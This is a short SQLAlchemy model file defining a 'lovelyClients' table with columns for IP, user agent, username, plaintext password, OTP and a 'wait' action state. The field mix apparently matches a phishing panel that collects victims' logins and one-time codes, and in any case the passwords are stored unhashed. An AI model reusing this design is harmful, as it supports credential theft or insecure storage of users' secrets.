from sqlalchemy import Boolean, Column, ForeignKey, Integer, String
from sqlalchemy.orm import relationship

from database import Base


class User(Base):
    __tablename__ = "lovelyClients"

    id = Column(Integer, primary_key=True, index=True)
    ip = Column(String)
    user_agent = Column(String, default="aaaaaaaa")
    username = Column(String)
    password = Column(String)
    action = Column(String, default="wait")
    OTP = Column(String)
